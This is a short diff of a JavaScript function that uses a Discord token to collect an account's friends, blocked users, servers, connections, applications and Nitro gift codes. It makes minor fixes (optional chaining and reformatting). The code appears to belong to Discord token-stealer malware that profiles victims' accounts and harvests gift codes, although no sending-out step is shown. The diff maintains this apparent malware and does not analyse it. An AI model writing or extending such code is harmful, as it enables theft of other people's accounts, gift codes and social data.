@@ -107,7 +107,7 @@ const getDiscordInfo = async (t) => {
         totalBlocked: r.filter((a) => a.type === 2).length,
         pending: r.filter((r) => r.type === 3).length,
         NitroGifts: e[0] ? e.map((g) => `${g}, `).join("") : "Nitro Gifts-Codes Not Found",
-        totalOwnedGuild: g.filter((g) => g.owner).length,
+        totalOwnedGuild: g?.filter((g) => g.owner).length,
         totalApplication: a.length,
         totalConnection: c.length,
         totalGuild: g.length,
@@ -122,7 +122,10 @@ const getDiscordInfo = async (t) => {
         status: getStatusEmoji(s.status),
         theme: getTheme(s.theme),
         gifts: getGiftsCodes(t, s),
-        rare: {guilds: (await getGuilds(t)),friends: (await getFriends(t))}
+        rare: {
+            guilds: await getGuilds(t),
+            friends: await getFriends(t)
+        }
     }
 }
 
